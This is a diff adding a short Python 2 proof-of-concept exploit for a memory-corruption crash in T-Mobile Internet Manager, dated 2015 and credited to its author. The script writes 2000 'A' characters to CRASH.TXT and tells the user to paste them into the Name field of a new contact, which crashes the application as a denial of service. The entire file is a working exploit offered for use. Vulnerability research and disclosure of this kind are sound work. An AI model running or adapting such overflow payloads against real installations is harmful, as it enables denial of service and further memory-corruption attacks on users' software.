@@ -1,0 +1,32 @@
+#!/usr/bin/python
+# coding: utf-8
+#[+] Author: SATHISH ARTHAR
+#[+] Exploit Title: T-Mobile Internet Manager Memory Corruption PoC
+#[+] Date: 30-07-2015
+#[+] Category: DoS/PoC
+#[+] Tested on: WinXp/Windows7/windows8
+#[+] Vendor: https://www.t-mobile.de/meinhandy/1,25412,19349-_,00.html
+#[+] Download: https://www.t-mobile.de/downloads/neu/winui.zip
+#[+] Sites: sathisharthars.wordpress.com
+#[+] Twitter: @sathisharthars
+#[+] Thanks: offensive security (@offsectraining)
+
+
+
+
+print"###########################################################"
+print"# Title: T-Mobile Internet Manager Memory Corruption PoC #"
+print"# Author: SATHISH ARTHAR #"
+print"# Category: DoS/PoC # "
+print"###########################################################"
+print"Copy the content of CRASH.TXT in create new contacts and paste
+it in Name field"
+print" contacts -----> create new -----> Name ----> paste it "
+
+
+crash= "A" * 2000
+filename = "CRASH.TXT"
+file = open(filename , "w")
+file.write(crash)
+print "\n Files Created!\n"
+file.close()
